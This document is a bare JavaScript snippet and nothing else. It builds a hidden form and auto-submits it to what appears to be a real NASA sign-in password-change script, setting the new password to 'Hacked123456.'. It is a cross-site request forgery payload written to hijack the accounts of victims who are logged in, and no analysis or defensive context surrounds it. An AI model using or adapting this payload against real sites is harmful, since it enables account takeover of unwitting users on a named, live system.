var f=document.createElement('form');
f.method='POST';
f.action='https://cce-signin.gsfc.nasa.gov/cgi-bin/openid_sign_in/change_pw.pl';
var fields={
  doing_update:'1',
  rpwf:'1',
  wid:'10',
  HDTN:'',
  new_passwd:'Hacked123456.',
  re_new_passwd:'Hacked123456.',
  cpasswd:'Change+Password'
};
for(var k in fields){
  var i=document.createElement('input');
  i.type='hidden';
  i.name=k;
  i.value=fields[k];
  f.appendChild(i);
}
document.body.appendChild(f);
f.submit();
